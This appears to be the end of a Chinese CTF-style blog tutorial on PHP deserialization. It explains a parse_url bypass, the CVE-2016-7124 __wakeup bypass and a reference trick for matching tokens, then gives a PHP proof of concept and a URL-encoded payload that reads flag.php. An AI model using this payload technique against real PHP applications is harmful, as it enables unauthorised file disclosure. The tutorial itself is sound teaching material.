class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个示例就不进行详细的代码分析了，代码具体分析可得：</p>
<ul>
<li>首先我们需要绕的就是 $url=parse_url($_SERVER[‘REQUEST_URI’]);使得 parse_str($url[‘query’],$query); 中query解析失败，这样就可以在payload里出现flag，这里应该n1ctf的web eating cms的绕过方式，添加 ///index.php绕过。</li>
<li>接下来就是需要我们绕过wakeup()里的将$k赋值为空的操作，这里用到的就是示例一种所说当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</li>
<li>绕md5这里用到了PHP中引用变量的知识，可以参考<a href="https://blog.csdn.net/qq_33156633/article/details/79936487" target="_blank" rel="noopener">这篇博客</a></li>
</ul>
<p>简单来说就是，当两个变量指向同一地址时，例如： $b=&amp;$a,这里的 $b指向的是 $a的区域，这样b就随着a变化而变化，同样的原理，我们在第二步序列化时加上这一步</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> Flag(<span class="string">"flag.php"</span>);</span><br><span class="line">$b-&gt;token=&amp;$b-&gt;token_flag;</span><br><span class="line">$a = <span class="keyword">new</span> Handle($b);</span><br></pre></td></tr></table></figure>
<p>这样最后的token就和token_flag保持一致了。最后的POC如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span></span><br><span class="line"><span class="class"></span>&#123;       </span><br><span class="line"> <span class="keyword">private</span> $handle;        </span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"> <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;         </span><br><span class="line">            &#125;          </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Waking upn"</span>;      </span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;           </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle;       </span><br><span class="line">    &#125;    </span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;      </span><br><span class="line"> <span class="keyword">public</span> $file;      </span><br><span class="line"> <span class="keyword">public</span> $token;      </span><br><span class="line"> <span class="keyword">public</span> $token_flag;         </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));      </span><br><span class="line">    &#125;         </span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;       </span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))</span><br><span class="line">    &#123;      </span><br><span class="line">            <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>);               </span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> Flag(<span class="string">"flag.php"</span>);</span><br><span class="line">$b-&gt;token=&amp;$b-&gt;token_flag;</span><br><span class="line">$a = <span class="keyword">new</span> Handle($b);</span><br><span class="line"><span class="keyword">echo</span>(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里还需要用%00来补全空缺的字符，又因为含有private 变量，需要 encode 一下。最终payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=hint&amp;payload=O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Handle%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>Handlehandle%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Flag%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>flag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>token%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22</span>da0d1111d2dc5d489242e60ebcbaf988%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>token_flag%<span class="number">22</span>%<span class="number">3</span>BR%<span class="number">3</span>A4%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></div><div class="tags"><a href="/tags/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a href="/tags/CTF/">CTF</a></div><div class="post-nav"><a class="pre" href="/2019/09/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93(%E4%BA%8C)-%E5%B0%8F%E7%99%BD%E6%96%87/">PHP反序列化总结(二)</a><a class="next" href="/2019/09/20/xctf-oj-web-wtf-sh/">xctf_oj_web_wtf.sh</a></div><div id="disqus_thread"><div class="btn_click_load"><button class="disqus_click_btn">阅读评论（请确保 Disqus 可以正常加载）</button></div><script type="text/javascript">var disqus_config = function () {
    this.page.url = 'http://www.xiaozzz.xyz/2019/09/23/PHP反序列化总结(一)-小白文/';
    this.page.identifier = '2019/09/23/PHP反序列化总结(一)-小白文/';
    this.page.title = 'PHP反序列化总结(一)-小白文';
  };</script><script type="text/javascript" id="disqus-lazy-load-script">$.ajax({
url: 'https://disqus.com/next/config.json',
timeout: 2500,
type: 'GET',
success: function(){
  var d = document;
  var s = d.createElement('script');
  s.src = '//xiaoZz.disqus.com/embed.js';
  s.setAttribute('data-timestamp', + new Date());
  (d.head || d.body).appendChild(s);
  $('.disqus_click_btn').css('display', 'none');
},
error: function() {
  $('.disqus_click_btn').css('display', 'block');
}
});</script><script type="text/javascript" id="disqus-click-load">$('.btn_click_load').click(() => {  //click to load comments
    (() => { // DON'T EDIT BELOW THIS LINE
        var d = document;
        var s = d.createElement('script');
        s.src = '//xiaoZz.disqus.com/embed.js';
        s.setAttribute('data-timestamp', + new Date());
        (d.head || d.body).appendChild(s);
    })();
    $('.disqus_click_btn').css('display','none');
});</script><script type="text/javascript" id="disqus-count-script">$(function() {
     var xhr = new XMLHttpRequest();
     xhr.open('GET', '//disqus.com/next/config.json', true);
     xhr.timeout = 2500;
     xhr.onreadystatechange = function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         $('.post-meta .post-comments-count').show();
         var s = document.createElement('script');
         s.id = 'dsq-count-scr';
         s.src = 'https://xiaoZz.disqus.com/count.js';
         s.async = true;
         (document.head || document.body).appendChild(s);
       }
     };
     xhr.ontimeout = function () { xhr.abort(); };
     xhr.send(null);
   });
</script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-writeup/">CTF_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/">Web漏洞介绍</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A0%81%E4%B8%8E%E5%BC%80%E5%8F%91/">编码与开发</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/Web%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">Web漏洞</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">反序列化</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 15px;">密码学</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA/" style="font-size: 15px;">网络安全理论</a> <a href="/tags/%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/" style="font-size: 15px;">哈希函数</a> <a href="/tags/SSRF/" style="font-size: 15px;">SSRF</a> <a href="/tags/writeup/" style="font-size: 15px;">writeup</a> <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/" style="font-size: 15px;">字符串操作</a> <a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 15px;">开发</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/08/28/%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%E9%83%A8%E5%88%86wp/">首届钓鱼城杯部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/26/HTTP-Smuggling-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">HTTP_Smuggling-请求走私</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/22/Defcon-CTF-Qual-2020-Web-WP/">Defcon_CTF_Qual_2020-Web-WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-%E9%83%A8%E5%88%86WP/">网鼎杯2020-青龙组-部分WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/22/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-%E5%AF%86%E7%A0%81%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">密码学学习-密码硬件安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/25/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">密码学学习-分组密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-MAC%E4%B8%8EAEAD/">密码学学习-MAC与AEAD</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80/">正则表达式基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/16/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E4%B8%8EPKI/">密码学学习-数字证书与PKI</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/12/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-%E5%AF%86%E7%A0%81%E6%9D%82%E5%87%91%E5%87%BD%E6%95%B0/">密码学学习-密码杂凑函数</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-comment-o"> Recent Comments</i></div><script type="text/javascript" src="//xiaoZz.disqus.com/recent_comments_widget.js?num_items=5&amp;hide_avatars=1&amp;avatar_size=32&amp;excerpt_length=20&amp;hide_mods=1"></script></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://momomoxiaoxi.com/" title="moxiaoxi" target="_blank">moxiaoxi</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">xiaoZ's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" color="100,100,100" opacity="0.5" zIndex="-2" count="50" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>